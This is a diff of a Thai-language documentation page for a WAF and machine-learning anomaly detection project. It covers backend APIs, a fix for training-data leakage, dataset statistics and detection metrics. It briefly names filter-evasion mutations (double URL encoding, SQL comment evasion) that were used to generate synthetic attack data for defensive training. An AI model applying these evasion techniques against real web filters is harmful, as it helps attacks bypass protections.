@@ -29,7 +29,8 @@
               accent: '#38bdf8',
               purple: '#a855f7',
               red: '#ef4444',
-              emerald: '#10b981'
+              emerald: '#10b981',
+              amber: '#f59e0b'
             }
           },
           fontFamily: {
@@ -94,7 +95,7 @@
           <span class="font-bold text-lg text-white tracking-wide flex items-center gap-2">
             WAF Project <span class="text-xs font-semibold px-2 py-0.5 rounded-full bg-brand-500/20 text-brand-400 border border-brand-500/30">v2.5 Production</span>
           </span>
-          <p class="text-xs text-slate-400">Global Edge CDN & AI/ML Anomaly Defense</p>
+          <p class="text-xs text-slate-400">Global Edge CDN & AI/ML Anomaly Defense Documentation</p>
         </div>
       </div>
 
@@ -102,7 +103,7 @@
       <div class="flex items-center space-x-4">
         <div class="hidden md:flex items-center bg-slate-900 border border-cyber-border rounded-lg px-3 py-1.5 w-64 focus-within:border-cyber-accent transition">
           <i data-lucide="search" class="w-4 h-4 text-slate-400 mr-2"></i>
-          <input type="text" id="searchInput" placeholder="ค้นหาเนื้อหา, Features, Rule ID..." class="bg-transparent text-xs text-white placeholder-slate-500 focus:outline-none w-full">
+          <input type="text" id="searchInput" placeholder="ค้นหาเนื้อหา, Features, Rule ID, API..." class="bg-transparent text-xs text-white placeholder-slate-500 focus:outline-none w-full">
         </div>
         <a href="https://waf-edge-th.duckdns.org" target="_blank" class="hidden sm:inline-flex items-center gap-1.5 text-xs font-medium bg-slate-800 hover:bg-slate-700 text-brand-400 border border-brand-500/30 px-3 py-1.5 rounded-lg transition">
           <span class="w-2 h-2 rounded-full bg-brand-400 animate-pulse"></span>
@@ -129,23 +130,32 @@
             <a href="#module-overview" class="nav-item flex items-center gap-2.5 px-3 py-2 rounded-xl text-slate-300 hover:text-white hover:bg-slate-800/60 transition">
               <i data-lucide="layout-dashboard" class="w-4 h-4 text-cyber-accent"></i> 1. ภาพรวมสถาปัตยกรรม
             </a>
+            <a href="#module-backend" class="nav-item flex items-center gap-2.5 px-3 py-2 rounded-xl text-slate-300 hover:text-white hover:bg-slate-800/60 transition">
+              <i data-lucide="server" class="w-4 h-4 text-emerald-400"></i> 2. สรุปฟังก์ชัน Backend ทั้งหมด
+            </a>
             <a href="#module-ml" class="nav-item flex items-center gap-2.5 px-3 py-2 rounded-xl text-slate-300 hover:text-white hover:bg-slate-800/60 transition">
-              <i data-lucide="brain-circuit" class="w-4 h-4 text-cyber-purple"></i> 2. Machine Learning Engine
+              <i data-lucide="brain-circuit" class="w-4 h-4 text-cyber-purple"></i> 3. โมเดล ML & Data Leakage
+            </a>
+            <a href="#module-features" class="nav-item flex items-center gap-2.5 px-3 py-2 rounded-xl text-slate-300 hover:text-white hover:bg-slate-800/60 transition">
+              <i data-lucide="sliders" class="w-4 h-4 text-cyber-accent"></i> 4. 13 Semantic Features & Metrics
             </a>
             <a href="#module-modsec" class="nav-item flex items-center gap-2.5 px-3 py-2 rounded-xl text-slate-300 hover:text-white hover:bg-slate-800/60 transition">
-              <i data-lucide="shield-alert" class="w-4 h-4 text-cyber-red"></i> 3. ModSecurity & OWASP CRS
+              <i data-lucide="shield-alert" class="w-4 h-4 text-cyber-red"></i> 5. ModSecurity & Blast Radius
             </a>
             <a href="#module-edge-cdn" class="nav-item flex items-center gap-2.5 px-3 py-2 rounded-xl text-slate-300 hover:text-white hover:bg-slate-800/60 transition">
-              <i data-lucide="globe" class="w-4 h-4 text-cyber-emerald"></i> 4. Edge CDN & GeoDNS
+              <i data-lucide="globe" class="w-4 h-4 text-cyber-emerald"></i> 6. Edge CDN & GeoDNS
             </a>
             <a href="#module-analytics" class="nav-item flex items-center gap-2.5 px-3 py-2 rounded-xl text-slate-300 hover:text-white hover:bg-slate-800/60 transition">
-              <i data-lucide="activity" class="w-4 h-4 text-amber-400"></i> 5. Stream Analytics & Logs
+              <i data-lucide="activity" class="w-4 h-4 text-amber-400"></i> 7. Stream Logs & ClickHouse
             </a>
             <a href="#module-genai" class="nav-item flex items-center gap-2.5 px-3 py-2 rounded-xl text-slate-300 hover:text-white hover:bg-slate-800/60 transition">
-              <i data-lucide="sparkles" class="w-4 h-4 text-indigo-400"></i> 6. GenAI & Advanced SecOps
+              <i data-lucide="sparkles" class="w-4 h-4 text-indigo-400"></i> 8. GenAI SecOps & PII Guard
+            </a>
+            <a href="#module-qa" class="nav-item flex items-center gap-2.5 px-3 py-2 rounded-xl text-slate-300 hover:text-white hover:bg-slate-800/60 transition">
+              <i data-lucide="help-circle" class="w-4 h-4 text-amber-400"></i> 9. ถาม-ตอบสัมมนา (Seminar Q&A)
             </a>
             <a href="#module-sandbox" class="nav-item flex items-center gap-2.5 px-3 py-2 rounded-xl text-brand-400 hover:text-brand-300 hover:bg-brand-900/30 transition font-medium">
-              <i data-lucide="play-circle" class="w-4 h-4 text-brand-400"></i> 7. Interactive Test Sandbox
+              <i data-lucide="play-circle" class="w-4 h-4 text-brand-400"></i> 10. Interactive Sandbox
             </a>
           </nav>
         </div>
@@ -154,15 +164,15 @@
         <div class="glass-card rounded-2xl p-4 text-xs space-y-2.5 border-slate-800">
           <div class="font-bold text-slate-300 flex items-center justify-between">
             <span>Server Nodes Status</span>
-            <span class="text-[10px] text-brand-400 bg-brand-500/10 px-2 py-0.5 rounded-full border border-brand-500/20">All Healthy</span>
+            <span class="text-[10px] text-brand-400 bg-brand-500/10 px-2 py-0.5 rounded-full border border-brand-500/20">All Active</span>
           </div>
           <div class="flex items-center justify-between text-slate-400">
             <span class="flex items-center gap-1.5"><span class="w-1.5 h-1.5 rounded-full bg-emerald-400"></span> Edge Node TH</span>
-            <code class="text-[11px] text-slate-300">45.154.26.91</code>
+            <code class="text-[11px] text-slate-300">45.154.26.91:8086</code>
           </div>
           <div class="flex items-center justify-between text-slate-400">
-            <span class="flex items-center gap-1.5"><span class="w-1.5 h-1.5 rounded-full bg-emerald-400"></span> Origin & ML Backend</span>
-            <code class="text-[11px] text-slate-300">178.104.53.123</code>
+            <span class="flex items-center gap-1.5"><span class="w-1.5 h-1.5 rounded-full bg-emerald-400"></span> Origin & Dashboard</span>
+            <code class="text-[11px] text-slate-300">178.104.53.123:8000</code>
           </div>
           <div class="flex items-center justify-between text-slate-400">
             <span class="flex items-center gap-1.5"><span class="w-1.5 h-1.5 rounded-full bg-emerald-400"></span> ML Microservice</span>
@@ -180,20 +190,23 @@
         <div class="absolute -right-16 -bottom-16 w-80 h-80 bg-brand-500/10 rounded-full blur-3xl pointer-events-none"></div>
         <div class="relative z-10 space-y-4">
           <div class="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-cyber-accent/10 border border-cyber-accent/30 text-cyber-accent text-xs font-semibold">
-            <i data-lucide="shield" class="w-3.5 h-3.5"></i> Comprehensive Engineering Seminar Document
+            <i data-lucide="shield" class="w-3.5 h-3.5"></i> Comprehensive Engineering Seminar Document & Backend Summary
           </div>
           <h1 class="text-3xl sm:text-4xl lg:text-5xl font-extrabold text-white tracking-tight leading-tight">
             Hybrid Edge WAF & <span class="bg-clip-text text-transparent bg-gradient-to-r from-cyber-accent via-brand-400 to-emerald-400">Machine Learning</span> Protection
           </h1>
           <p class="text-slate-300 text-sm sm:text-base max-w-3xl leading-relaxed">
-            สถาปัตยกรรมการป้องกันเว็บแอปพลิเคชันยุคใหม่ ผสานความเร็วของ <strong>OWASP ModSecurity Core Rule Set (In-line)</strong>, ความแม่นยำของ <strong>Multi-Region Edge CDN</strong> และความฉลาดของ <strong>Decoupled AI/ML Anomaly Detection</strong> สำหรับตรวจจับภัยคุกคาม Zero-Day และ Injections ซับซ้อน
+            สถาปัตยกรรมการป้องกันเว็บแอปพลิเคชันยุคใหม่ ผสานความเร็วของ <strong>OWASP ModSecurity Core Rule Set (In-line Fast Path)</strong>, ความยืดหยุ่นของ <strong>Multi-Region Edge CDN</strong> และความแม่นยำของ <strong>Decoupled AI/ML Anomaly Detection</strong> พร้อมระบบจัดการผ่าน Dashboard API แบบ Full-Stack
           </p>
           <div class="pt-2 flex flex-wrap gap-3">
-            <a href="#module-ml" class="px-5 py-2.5 rounded-xl bg-gradient-to-r from-brand-600 to-brand-500 hover:from-brand-500 hover:to-brand-400 text-white text-sm font-semibold shadow-lg shadow-brand-500/25 transition inline-flex items-center gap-2">
-              <i data-lucide="file-text" class="w-4 h-4"></i> อ่านสรุปเนื้อหา ML & Data Leakage Fix
+            <a href="#module-backend" class="px-5 py-2.5 rounded-xl bg-gradient-to-r from-brand-600 to-brand-500 hover:from-brand-500 hover:to-brand-400 text-white text-sm font-semibold shadow-lg shadow-brand-500/25 transition inline-flex items-center gap-2">
+              <i data-lucide="server" class="w-4 h-4"></i> ดูฟังก์ชัน Backend ทั้งหมด
+            </a>
+            <a href="#module-ml" class="px-5 py-2.5 rounded-xl bg-slate-800 hover:bg-slate-700 text-slate-200 border border-cyber-border text-sm font-medium transition inline-flex items-center gap-2">
+              <i data-lucide="file-text" class="w-4 h-4 text-cyber-purple"></i> สรุป ML & Data Leakage Fix
             </a>
             <a href="#module-sandbox" class="px-5 py-2.5 rounded-xl bg-slate-800 hover:bg-slate-700 text-slate-200 border border-cyber-border text-sm font-medium transition inline-flex items-center gap-2">
-              <i data-lucide="play" class="w-4 h-4 text-cyber-accent"></i> ทดลองยิง Payload ใน Sandbox
+              <i data-lucide="play" class="w-4 h-4 text-cyber-accent"></i> ทดลองยิง Sandbox
             </a>
           </div>
         </div>
@@ -248,14 +261,183 @@ flowchart TD
         </div>
       </section>
 
-      <!-- MODULE 2: MACHINE LEARNING ENGINE -->
+      <!-- MODULE 2: COMPLETE BACKEND FUNCTIONS SUMMARY -->
+      <section id="module-backend" class="space-y-6 pt-4">
+        <div class="border-b border-cyber-border pb-4 flex items-center gap-3">
+          <div class="p-2 rounded-xl bg-emerald-500/10 text-emerald-400">
+            <i data-lucide="server" class="w-6 h-6"></i>
+          </div>
+          <div>
+            <h2 class="text-2xl font-bold text-white">2. สรุปฟังก์ชัน Backend ทั้งหมดที่พัฒนาขึ้น (Complete Backend Functions)</h2>
+            <p class="text-sm text-slate-400">รายละเอียด REST API Routers, Security Services, และระบบเบื้องหลังทั้งหมดบน Branch Backend</p>
+          </div>
+        </div>
+
+        <!-- Backend APIs Grid -->
+        <div class="grid grid-cols-1 md:grid-cols-2 gap-4 text-xs">
+          <!-- API 1: AI Threat Intelligence -->
+          <div class="glass-card rounded-2xl p-5 space-y-2 border-slate-800">
+            <div class="flex items-center justify-between">
+              <span class="font-bold text-sm text-indigo-400 flex items-center gap-2">
+                <i data-lucide="sparkles" class="w-4 h-4"></i> AI Threat Intelligence API
+              </span>
+              <code class="px-2 py-0.5 rounded bg-indigo-950 text-indigo-300 font-mono text-[10px]">/api/ai</code>
+            </div>
+            <p class="text-slate-300 leading-relaxed">
+              เชื่อมต่อ Google Gemini API สำหรับสรุปเหตุการณ์ภัยคุกคามภาษาไทยตามช่วงเวลา รองรับการประมวลผลคำสั่งภาษาธรรมชาติ (Natural Language Time Parsing เช่น "สรุป 3 วันล่าสุด", "เมื่อวานถึงตอนนี้")
+            </p>
+            <div class="text-[11px] text-slate-400 font-mono bg-slate-950/80 p-2.5 rounded-lg">
+              POST /api/ai/summarize-range &rarr; คำนวณสรุปสถิติและเหตุการณ์จาก ClickHouse + DynamoDB
+            </div>
+          </div>
+
+          <!-- API 2: Real-time Analytics -->
+          <div class="glass-card rounded-2xl p-5 space-y-2 border-slate-800">
+            <div class="flex items-center justify-between">
+              <span class="font-bold text-sm text-amber-400 flex items-center gap-2">
+                <i data-lucide="bar-chart-3" class="w-4 h-4"></i> Real-time Analytics API
+              </span>
+              <code class="px-2 py-0.5 rounded bg-amber-950 text-amber-300 font-mono text-[10px]">/api/analytics</code>
+            </div>
+            <p class="text-slate-300 leading-relaxed">
+              ดึงข้อมูลสถิติรวมแบบ Columnar จาก ClickHouse Database: ยอดรวม Request, จำนวนที่ Block/Allow, Unique IPs, Average Latency, สถิติการโจมตีแยกประเภท และการกระจายตัวตามประเทศ (GeoIP)
+            </p>
+            <div class="text-[11px] text-slate-400 font-mono bg-slate-950/80 p-2.5 rounded-lg">
+              GET /api/analytics/summary &rarr; Real-time aggregates + AI-generated summary
+            </div>
+          </div>
+
+          <!-- API 3: IP Rules Manager -->
+          <div class="glass-card rounded-2xl p-5 space-y-2 border-slate-800">
+            <div class="flex items-center justify-between">
+              <span class="font-bold text-sm text-cyber-accent flex items-center gap-2">
+                <i data-lucide="shield" class="w-4 h-4"></i> IP Rules & CIDR Manager API
+              </span>
+              <code class="px-2 py-0.5 rounded bg-cyan-950 text-cyan-300 font-mono text-[10px]">/api/ip-rules</code>
+            </div>
+            <p class="text-slate-300 leading-relaxed">
+              ระบบจัดการ Blocklist / Whitelist ราย IP และ CIDR Block รองรับการตั้งเวลาหมดอายุ (TTL Auto-Expiry) ซิงค์ลง ModSecurity <code>global_blocklist.txt</code> และ <code>global_whitelist.txt</code> ทันที
+            </p>
+            <div class="text-[11px] text-slate-400 font-mono bg-slate-950/80 p-2.5 rounded-lg">
+              GET, POST, DELETE /api/ip-rules &rarr; CRUD กฎ IP พร้อม Bulk Actions & Filter
+            </div>
+          </div>
+
+          <!-- API 4: Rate Limiting Engine -->
+          <div class="glass-card rounded-2xl p-5 space-y-2 border-slate-800">
+            <div class="flex items-center justify-between">
+              <span class="font-bold text-sm text-cyber-red flex items-center gap-2">
+                <i data-lucide="gauge" class="w-4 h-4"></i> Granular Rate Limiting API
+              </span>
+              <code class="px-2 py-0.5 rounded bg-red-950 text-red-300 font-mono text-[10px]">/api/rate-limits</code>
+            </div>
+            <p class="text-slate-300 leading-relaxed">
+              ตั้งค่านโยบายจำกัดอัตราการส่ง Request ตาม Path Pattern (เช่น <code>/api/auth/*</code>, <code>/login</code>), Sliding Window, Burst allowance, และเลือก Action ได้ระหว่าง HTTP 429 หรือ Temp Ban
+            </p>
+            <div class="text-[11px] text-slate-400 font-mono bg-slate-950/80 p-2.5 rounded-lg">
+              GET, POST, PUT, DELETE /api/rate-limits/rules &rarr; จัดการกฎและ Reset Client IP
+            </div>
+          </div>
+
+          <!-- API 5: ML Rule Suggestion & Approval -->
+          <div class="glass-card rounded-2xl p-5 space-y-2 border-slate-800">
+            <div class="flex items-center justify-between">
+              <span class="font-bold text-sm text-cyber-purple flex items-center gap-2">
+                <i data-lucide="check-square" class="w-4 h-4"></i> ML Rules Human-in-the-Loop API
+              </span>
+              <code class="px-2 py-0.5 rounded bg-purple-950 text-purple-300 font-mono text-[10px]">/api/ml-rules</code>
+            </div>
+            <p class="text-slate-300 leading-relaxed">
+              ระบบตรวจสอบและอนุมัติกฎที่สร้างอัตโนมัติจากโมเดล ML (Auto Rule Generator) ก่อนนำไป Deploy จริง: มีสถานะ Pending, Approved, Rejected พร้อมเขียนไฟล์ <code>custom-{id}.conf</code> และ Reload Nginx
+            </p>
+            <div class="text-[11px] text-slate-400 font-mono bg-slate-950/80 p-2.5 rounded-lg">
+              POST /api/ml-rules/{id}/approve &rarr; อนุมัติกฎและ Reload WAF Edge Node
+            </div>
+          </div>
+
+          <!-- API 6: Multi-Tenant Origins & Custom Domains -->
+          <div class="glass-card rounded-2xl p-5 space-y-2 border-slate-800">
+            <div class="flex items-center justify-between">
+              <span class="font-bold text-sm text-brand-400 flex items-center gap-2">
+                <i data-lucide="network" class="w-4 h-4"></i> Origins & Custom Domains API
+              </span>
+              <code class="px-2 py-0.5 rounded bg-emerald-950 text-emerald-300 font-mono text-[10px]">/api/origins, /api/domains</code>
+            </div>
+            <p class="text-slate-300 leading-relaxed">
+              จัดการ Origin Upstream Servers รองรับการ Archive, Restore, Port Health Check และระบบผูก Custom Domain พร้อมสร้าง Verification Token และ Worker ตรวจสอบ DNS TXT Record อัตโนมัติ
+            </p>
+            <div class="text-[11px] text-slate-400 font-mono bg-slate-950/80 p-2.5 rounded-lg">
+              POST /api/domains &rarr; ออก Verification Token และตรวจสอบสถานะ SSL/DNS
+            </div>
+          </div>
+
+          <!-- API 7: ClickHouse Log Explorer & Explainability -->
+          <div class="glass-card rounded-2xl p-5 space-y-2 border-slate-800">
+            <div class="flex items-center justify-between">
+              <span class="font-bold text-sm text-cyber-accent flex items-center gap-2">
+                <i data-lucide="file-search" class="w-4 h-4"></i> Logs Explorer & AI Explainability API
+              </span>
+              <code class="px-2 py-0.5 rounded bg-cyan-950 text-cyan-300 font-mono text-[10px]">/api/logs</code>
+            </div>
+            <p class="text-slate-300 leading-relaxed">
+              ค้นหาและกรอง Log จาก ClickHouse พร้อมระบบ Pagination, กรอง Severity/Status/Method, ระบบ Masking PII Preview สำหรับ PDPA, และระบบ AI อธิบายสาเหตุที่ถูกบล็อก (Human-friendly explanation)
+            </p>
+            <div class="text-[11px] text-slate-400 font-mono bg-slate-950/80 p-2.5 rounded-lg">
+              GET /api/logs/recent, POST /api/logs/explain &rarr; ค้นหาและวิเคราะห์เชิงลึก
+            </div>
+          </div>
+
+          <!-- API 8: Blast Radius Simulator -->
+          <div class="glass-card rounded-2xl p-5 space-y-2 border-slate-800">
+            <div class="flex items-center justify-between">
+              <span class="font-bold text-sm text-yellow-400 flex items-center gap-2">
+                <i data-lucide="flask-conical" class="w-4 h-4"></i> Blast Radius Simulator API
+              </span>
+              <code class="px-2 py-0.5 rounded bg-yellow-950 text-yellow-300 font-mono text-[10px]">/api/rules/blast-radius</code>
+            </div>
+            <p class="text-slate-300 leading-relaxed">
+              จำลองผลกระทบของ ModSecurity Rule หรือ Regular Expression ตัวใหม่เทียบกับประวัติ Log จริงใน ClickHouse เพื่อประเมิน False Positive Rate, จำนวน Request ที่โดนบล็อก และรายการ URL ที่กระทบก่อนเปิดใช้งานจริง
+            </p>
+            <div class="text-[11px] text-slate-400 font-mono bg-slate-950/80 p-2.5 rounded-lg">
+              POST /api/rules/blast-radius &rarr; วิเคราะห์ Impact Percentage & Sample Matches
+            </div>
+          </div>
+        </div>
+
+        <!-- Security Services Deep-dive -->
+        <div class="glass-card rounded-2xl p-6 space-y-4">
+          <h3 class="font-bold text-base text-white flex items-center gap-2">
+            <i data-lucide="cpu" class="w-5 h-5 text-emerald-400"></i> Core Security & Data Services Architecture
+          </h3>
+          <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-3 text-xs">
+            <div class="p-3 bg-slate-900/90 rounded-xl border border-slate-800 space-y-1">
+              <span class="font-bold text-cyber-accent block">🛡️ BOLA Guard</span>
+              <p class="text-slate-400">ตรวจจับ Broken Object Level Authorization ใน API Endpoint ป้องกันการเข้าถึง ID ข้ามบัญชี</p>
+            </div>
+            <div class="p-3 bg-slate-900/90 rounded-xl border border-slate-800 space-y-1">
+              <span class="font-bold text-emerald-400 block">🔒 PII Masker (PDPA)</span>
+              <p class="text-slate-400">เซ็นเซอร์เลขบัตรประชาชน, บัตรเครดิต, เบอร์โทร, อีเมล และ Token ก่อนส่งบันทึกหรือส่งเข้า AI</p>
+            </div>
+            <div class="p-3 bg-slate-900/90 rounded-xl border border-slate-800 space-y-1">
+              <span class="font-bold text-yellow-400 block">⚡ Safe Regex Engine</span>
+              <p class="text-slate-400">ทดสอบ Catastrophic Backtracking ป้องกัน Regex Denial of Service (ReDoS) ใน Custom Rules</p>
+            </div>
+            <div class="p-3 bg-slate-900/90 rounded-xl border border-slate-800 space-y-1">
+              <span class="font-bold text-indigo-400 block">📱 Telegram Listener</span>
+              <p class="text-slate-400">ดักฟังและส่งข้อความแจ้งเตือนภัยคุกคามระดับสูงเข้า Telegram Chat แบบ Real-time</p>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <!-- MODULE 3: MACHINE LEARNING ENGINE & DATA LEAKAGE -->
       <section id="module-ml" class="space-y-6 pt-4">
         <div class="border-b border-cyber-border pb-4 flex items-center gap-3">
           <div class="p-2 rounded-xl bg-cyber-purple/10 text-cyber-purple">
             <i data-lucide="brain-circuit" class="w-6 h-6"></i>
           </div>
           <div>
-            <h2 class="text-2xl font-bold text-white">2. Machine Learning Anomaly Detection Module</h2>
+            <h2 class="text-2xl font-bold text-white">3. Machine Learning Anomaly Detection Module (สรุปงานสัมมนา)</h2>
             <p class="text-sm text-slate-400">บทวิเคราะห์ Data Leakage, การสร้าง Synthetic Dataset, Feature Engineering และตัวชี้วัดจริง</p>
           </div>
         </div>
@@ -263,43 +445,99 @@ flowchart TD
         <!-- Data Leakage Card -->
         <div class="glass-card rounded-2xl p-6 border-cyber-red/30 space-y-4">
           <div class="flex items-center gap-2 text-cyber-red font-bold text-base">
-            <i data-lucide="alert-triangle" class="w-5 h-5"></i> 2.1 ปัญหา Data Leakage ใน Pipeline เดิม และการค้นพบเชิงลึก
+            <i data-lucide="alert-triangle" class="w-5 h-5"></i> 3.1 ปัญหา Data Leakage ใน Pipeline เดิม และการค้นพบเชิงลึก
           </div>
           <p class="text-sm text-slate-300 leading-relaxed">
-            จากการวิเคราะห์โค้ดเดิม พบว่ามีการนำ Payload เสริม 37 รายการมาทำ <code>df_combined = pd.concat([df_csic] + [df_benign_extra]*500 + [df_attack_extra]*500)</code> ซึ่งการคูณข้อมูลซ้ำ 500 เท่าทำให้แถวข้อมูลที่เหมือนกันทุกตัวอักษร 375 แถวไปอยู่ใน Train Set และอีก 125 แถวไปอยู่ใน Test Set ส่งผลให้โมเดลได้ <strong>Accuracy สูงเกินจริง (Fake 94%+)</strong> จากการท่องจำตัวอย่างเดิม
+            จากการตรวจสอบโค้ด Pipeline เดิม พบว่ามีการนำ Payload เสริม 37 รายการมาทำ <code>df_combined = pd.concat([df_csic] + [df_benign_extra]*500 + [df_attack_extra]*500)</code> ซึ่งการคูณข้อมูลซ้ำ 500 เท่าก่อนทำ <code>train_test_split(75/25)</code> ทำให้แถวข้อมูลที่เหมือนกันทุกตัวอักษร 375 แถวไปอยู่ใน Train Set และอีก 125 แถวหลุดไปอยู่ใน Test Set ส่งผลให้โมเดลทำคะแนนได้ <strong>Accuracy สูงเกินจริง (Fake 94%+)</strong> จากการท่องจำตัวอย่างเดิม (Overfitting & Memorization)
           </p>
           <div class="grid grid-cols-1 md:grid-cols-2 gap-4 text-xs pt-2">
             <div class="bg-slate-900/90 p-4 rounded-xl border border-red-500/20">
               <h4 class="font-bold text-red-400 mb-2">❌ ปัญหาของ Pipeline และ CSIC 2010 เดิม</h4>
               <ul class="space-y-1.5 text-slate-400 list-disc list-inside">
-                <li>Exact Row Duplication คูณ 500 เท่า ทำให้เกิด Data Leakage</li>
+                <li>Exact Row Duplication คูณ 500 เท่า ทำให้เกิด Data Leakage รุนแรง</li>
                 <li>CSIC มี Header Label Noise กว่า 5,400 แถวที่เป็น URL ว่างแต่โดนติดป้าย Attack</li>
                 <li>Path-Length Bias: URL สั้นถูกมองเป็น Attack เพราะ CSIC มีแต่ e-commerce ยาวๆ</li>
-                <li>ขาด Threat Vectors ยุคใหม่ (SSRF, SSTI, NoSQL, Log4j)</li>
+                <li>ขาด Threat Vectors ยุคใหม่ (SSRF, SSTI, NoSQL, Log4Shell)</li>
               </ul>
             </div>
             <div class="bg-slate-900/90 p-4 rounded-xl border border-brand-500/20">
               <h4 class="font-bold text-brand-400 mb-2">✅ วิธีการแก้ไขด้วย Synthetic Data Generator</h4>
               <ul class="space-y-1.5 text-slate-400 list-disc list-inside">
-                <li>สร้างสคริปต์สังเคราะห์ข้อมูลอัจฉริยะ 35,000+ รายการแบบสุ่มแท้จริง</li>
-                <li>Fuzzing & Mutation (Case variation, URL encode, Comment evasion)</li>
-                <li>Global Deduplication การันตีว่าข้อมูล 60,106 แถวไม่ซ้ำกัน 100% (Zero Leakage)</li>
+                <li>พัฒนาสคริปต์สังเคราะห์ข้อมูลอัจฉริยะใน <code>ml/download_dataset.py</code> 35,000+ ตัวอย่าง</li>
+                <li>Mutation Engine: Fuzzing, URL Encoding (%2527, %27), Comment Evasion (/**/)</li>
+                <li>Global SHA-256 Deduplication การันตีข้อมูล 60,106 แถวไม่ซ้ำกัน 100% (Zero Leakage)</li>
                 <li>ทดสอบบน Holdout Unseen Test Data 15,027 แถวจริง</li>
               </ul>
             </div>
           </div>
         </div>
 
-        <!-- Evaluation Metrics Card -->
+        <!-- Dataset Breakdown Table -->
         <div class="glass-card rounded-2xl p-6 space-y-4">
           <h3 class="font-bold text-base text-white flex items-center gap-2">
-            <i data-lucide="award" class="w-5 h-5 text-amber-400"></i> 2.2 ผลการประเมินประสิทธิภาพจริง (Genuine Evaluation Benchmark)
+            <i data-lucide="database" class="w-5 h-5 text-cyber-accent"></i> 3.2 สรุปปริมาณชุดข้อมูลหลังการคลีนและสังเคราะห์ (Dataset Statistics)
+          </h3>
+          <div class="overflow-x-auto">
+            <table class="w-full text-xs text-left border-collapse">
+              <thead>
+                <tr class="bg-slate-900 border-b border-cyber-border text-slate-300">
+                  <th class="p-3">ประเภทข้อมูล (Dataset Source)</th>
+                  <th class="p-3 text-emerald-400">Benign (ปกติ)</th>
+                  <th class="p-3 text-cyber-red">Attack (โจมตี)</th>
+                  <th class="p-3 text-white">รวมทั้งหมด (Total Unique)</th>
+                  <th class="p-3">ลักษณะเด่นของข้อมูล</th>
+                </tr>
+              </thead>
+              <tbody class="divide-y divide-cyber-border text-slate-300 font-mono">
+                <tr>
+                  <td class="p-3 font-sans font-medium text-slate-300">CSIC 2010 Cleaned (กรอง Header Noise)</td>
+                  <td class="p-3 text-emerald-400">14,848</td>
+                  <td class="p-3 text-red-400">10,246</td>
+                  <td class="p-3 text-white font-bold">25,094 แถว</td>
+                  <td class="p-3 font-sans text-slate-400">ตัด Header Anomalies ออก คงเหลือเฉพาะ Path/Query ที่สมบูรณ์</td>
+                </tr>
+                <tr>
+                  <td class="p-3 font-sans font-medium text-slate-300">Modern Synthetic Payloads (สร้างใหม่)</td>
+                  <td class="p-3 text-emerald-400">14,968</td>
+                  <td class="p-3 text-red-400">20,044</td>
+                  <td class="p-3 text-white font-bold">35,012 แถว</td>
+                  <td class="p-3 font-sans text-slate-400">SQLi, XSS, Path Traversal, RCE, SSRF, SSTI, NoSQL, Log4Shell</td>
+                </tr>
+                <tr class="bg-slate-900/50">
+                  <td class="p-3 font-sans font-bold text-brand-400">Total Combined Unique Dataset</td>
+                  <td class="p-3 text-emerald-400 font-bold">29,816 (49.6%)</td>
+                  <td class="p-3 text-red-400 font-bold">30,290 (50.4%)</td>
+                  <td class="p-3 text-brand-400 font-bold text-sm">60,106 แถว</td>
+                  <td class="p-3 font-sans text-brand-400 font-semibold">Zero Duplicate 100% (ปราศจาก Data Leakage)</td>
+                </tr>
+              </tbody>
+            </table>
+          </div>
+        </div>
+      </section>
+
+      <!-- MODULE 4: 13 SEMANTIC FEATURES & EVALUATION BENCHMARK -->
+      <section id="module-features" class="space-y-6 pt-4">
+        <div class="border-b border-cyber-border pb-4 flex items-center gap-3">
+          <div class="p-2 rounded-xl bg-cyber-accent/10 text-cyber-accent">
+            <i data-lucide="sliders" class="w-6 h-6"></i>
+          </div>
+          <div>
+            <h2 class="text-2xl font-bold text-white">4. 13 Semantic Features & ตัวชี้วัดประสิทธิภาพจริง (Evaluation Benchmark)</h2>
+            <p class="text-sm text-slate-400">การออกแบบฟีเจอร์เชิงความหมายเพื่อลด False Positive และผลการทดสอบบน Unseen Test Data</p>
+          </div>
+        </div>
+
+        <!-- Evaluation Metrics Summary -->
+        <div class="glass-card rounded-2xl p-6 space-y-4">
+          <h3 class="font-bold text-base text-white flex items-center gap-2">
+            <i data-lucide="award" class="w-5 h-5 text-amber-400"></i> 4.1 ผลการประเมินประสิทธิภาพจริง (Genuine Evaluation Benchmark)
           </h3>
           <div class="grid grid-cols-2 sm:grid-cols-4 gap-4 text-center">
             <div class="bg-slate-900/80 p-4 rounded-xl border border-cyber-border">
               <span class="text-xs text-slate-400 block mb-1">Accuracy จริง</span>
               <span class="text-2xl font-extrabold text-brand-400">80.47%</span>
-              <span class="text-[10px] text-slate-500 block mt-1">บน Holdout Test Data</span>
+              <span class="text-[10px] text-slate-500 block mt-1">บน Holdout Test Data 15,027 แถว</span>
             </div>
             <div class="bg-slate-900/80 p-4 rounded-xl border border-cyber-border">
               <span class="text-xs text-slate-400 block mb-1">ROC-AUC Score</span>
@@ -340,7 +578,7 @@ flowchart TD
                   <td class="p-3 font-sans font-medium text-slate-300">Actual Attack (7,573 ตัวอย่าง)</td>
                   <td class="p-3 text-yellow-400">2,858 (FN)</td>
                   <td class="p-3 text-red-400 font-bold bg-red-500/5">4,715 (TP)</td>
-                  <td class="p-3 font-sans text-slate-400">Precision 98.39% เตือนแล้วตรงเป้าหมาย</td>
+                  <td class="p-3 font-sans text-slate-400">Precision 98.39% เตือนแล้วตรงเป้าหมาย มั่นใจได้ใน SOC</td>
                 </tr>
               </tbody>
             </table>
@@ -350,7 +588,7 @@ flowchart TD
         <!-- 13 Features Table -->
         <div class="glass-card rounded-2xl p-6 space-y-4">
           <h3 class="font-bold text-base text-white flex items-center gap-2">
-            <i data-lucide="sliders" class="w-5 h-5 text-cyber-accent"></i> 2.3 ตารางฟีเจอร์เชิงความปลอดภัย (13 Pure Semantic Security Features)
+            <i data-lucide="sliders" class="w-5 h-5 text-cyber-accent"></i> 4.2 ตารางฟีเจอร์เชิงความปลอดภัย (13 Pure Semantic Security Features)
           </h3>
           <div class="overflow-x-auto">
             <table class="w-full text-xs text-left border-collapse">
@@ -363,34 +601,70 @@ flowchart TD
                 </tr>
               </thead>
               <tbody class="divide-y divide-cyber-border text-slate-300">
-                <tr><td class="p-2.5 font-mono text-slate-500">1</td><td class="p-2.5 font-mono text-cyber-accent">special_char_count</td><td class="p-2.5">int</td><td class="p-2.5">นับอักขระอันตราย (<code>' " ; < > \ $ ( ) | ` ^ ~ * # { } [ ]</code>) โดยไม่นับเครื่องหมาย URL ปกติ</td></tr>
